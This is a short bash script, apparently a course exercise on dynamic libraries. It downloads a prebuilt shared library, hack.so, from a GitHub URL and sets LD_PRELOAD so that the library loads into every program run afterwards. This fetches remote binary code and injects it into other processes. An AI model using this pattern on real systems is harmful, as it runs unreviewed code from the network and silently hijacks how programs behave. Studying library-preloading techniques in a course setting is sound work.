#!/bin/bash
wget -P .. https://raw.githubusercontent.com/yusuf-muibi/alx-low_level_programming/master/0x18-dynamic_libraries/hack.so
export LD_PRELOAD="$PWD/../hack.so"
